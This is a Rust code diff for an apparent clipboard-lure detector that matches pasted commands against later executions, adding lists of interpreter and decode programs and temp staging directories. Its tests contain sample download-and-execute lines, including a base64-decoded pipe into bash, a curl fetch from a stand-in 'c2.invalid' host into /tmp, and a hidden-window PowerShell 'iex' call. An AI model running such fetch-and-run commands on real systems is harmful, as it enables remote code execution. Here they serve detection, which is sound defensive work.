@@ -194,11 +194,48 @@ pub fn segments(text: &str) -> Vec<String> {
 /// Shortest segment of a multi-line paste that identifies a command by itself.
 const MIN_MULTILINE_SEGMENT_LEN: usize = 12;
 
+/// Programs that turn a pipeline's text into execution: interpreters, plus the local
+/// decode steps a lure pipes through on the way (`base64 -d`, `xxd -r`, `gunzip`).
+const PIPELINE_STAGES: &[&str] = &[
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "fish",
+    "perl",
+    "ruby",
+    "node",
+    "php",
+    "osascript",
+    "base64",
+    "base32",
+    "basenc",
+    "xxd",
+    "gunzip",
+    "zcat",
+    "openssl",
+    "rev",
+    "tr",
+    "curl",
+    "wget",
+    "powershell",
+    "pwsh",
+    "iex",
+];
+
+fn pipeline_stage(segment: &str) -> bool {
+    let first = segment.split(' ').next().unwrap_or_default();
+    let name = program_name(first);
+    PIPELINE_STAGES.contains(&name.as_str()) || name.starts_with("python")
+}
+
 /// The segments of a paste worth matching against execs. `segments` splits on every line,
 /// so a multi-line paste yields fragments such as `}` or `wc -w` that any unrelated script
 /// also contains. A one-line paste is one command, so all its pipeline stages stay (the
-/// `bash` of `curl ... | bash`); a multi-line paste keeps only segments with an argument
-/// and enough text to be specific, plus the whole text. Punctuation never matches.
+/// `bash` of `curl ... | bash`). A multi-line paste keeps segments with an argument and
+/// enough text to be specific, short segments whose program is an interpreter or decode
+/// step (`bash`, `base64 -d`), and the whole text. Punctuation never matches.
 fn indexable_segments(text: &str) -> Vec<String> {
     let trimmed = text.trim();
     let multiline = trimmed.contains(['\n', '\r']);
@@ -210,6 +247,7 @@ fn indexable_segments(text: &str) -> Vec<String> {
             !multiline
                 || whole.as_deref() == Some(s.as_str())
                 || (s.contains(' ') && s.len() >= MIN_MULTILINE_SEGMENT_LEN)
+                || pipeline_stage(s)
         })
         .collect()
 }
@@ -279,6 +317,16 @@ const INTERPRETERS: &[&str] = &[
     "sh", "bash", "zsh", "dash", "ksh", "fish", "perl", "ruby", "node", "php", "lua",
 ];
 
+/// Download and temp locations a lure stages a script in.
+const STAGING_DIRS: &[&str] = &[
+    "/tmp/",
+    "/var/tmp/",
+    "/dev/shm/",
+    "/Downloads/",
+    "/.cache/",
+    "/private/tmp/",
+];
+
 fn program_name(argv0: &str) -> String {
     let base = argv0.rsplit(['/', '\\']).next().unwrap_or(argv0);
     base.strip_suffix(".exe").unwrap_or(base).to_lowercase()
@@ -303,11 +351,20 @@ pub fn runs_its_arguments(argv: &[String]) -> bool {
         return true;
     }
     let interpreter = INTERPRETERS.contains(&name.as_str()) || name.starts_with("python");
-    interpreter
-        && argv[1..].iter().any(|a| {
-            // Short-flag clusters carrying inline code: `bash -lc`, `perl -e`, `node -pe`.
-            a.starts_with('-') && !a.starts_with("--") && a.contains(['c', 'e'])
-        })
+    if !interpreter {
+        return false;
+    }
+    // Short-flag clusters carrying inline code: `bash -lc`, `perl -e`, `node -pe`.
+    let inline = argv[1..]
+        .iter()
+        .any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains(['c', 'e']));
+    // A script run from a download or temp location is the second half of
+    // download-then-execute, so its command line is worth scoring too.
+    let staged = argv[1..]
+        .iter()
+        .find(|a| !a.starts_with('-'))
+        .is_some_and(|script| STAGING_DIRS.iter().any(|d| script.contains(d)));
+    inline || staged
 }
 
 /// The command text to score for an exec: the -c script if present, else argv joined.
@@ -384,6 +441,12 @@ mod tests {
         assert!(b.match_exec(&script).is_none());
         let wc = ["wc", "-w"].map(String::from).to_vec();
         assert!(b.match_exec(&wc).is_none());
+        // Short interpreter and decode stages of a multi-line paste still match.
+        let pasted = "cd /tmp\necho aGk= | base64 -d | bash";
+        b.record(pasted, entry("h4"));
+        let b64 = ["base64", "-d"].map(String::from).to_vec();
+        assert!(b.match_exec(&b64).is_some());
+        assert!(b.match_exec(&["bash".to_string()]).is_some());
         // A specific command from the same paste still matches.
         let curl = ["curl", "-fsSL", "https://c2.invalid/a.sh", "-o", "/tmp/a"]
             .map(String::from)
@@ -405,6 +468,7 @@ mod tests {
             args(&["./set_clipboard", lure]),
             args(&["python3", "set_clipboard.py", lure]),
             args(&["bash", "helper.sh", lure]),
+            args(&["python3", "/home/me/src/app/tool.py", lure]),
         ] {
             assert!(!runs_its_arguments(&carrier), "{carrier:?}");
         }
@@ -417,6 +481,9 @@ mod tests {
             args(&["curl", "-o", "/tmp/a", "https://c2.invalid/a"]),
             args(&["sudo", "bash", "/tmp/a"]),
             args(&["powershell.exe", "-w", "h", "iex x"]),
+            args(&["bash", "/tmp/u.sh"]),
+            args(&["sh", "/home/me/Downloads/fix.sh", "--yes"]),
+            args(&["python3", "/dev/shm/p.py"]),
         ] {
             assert!(runs_its_arguments(&runner), "{runner:?}");
         }
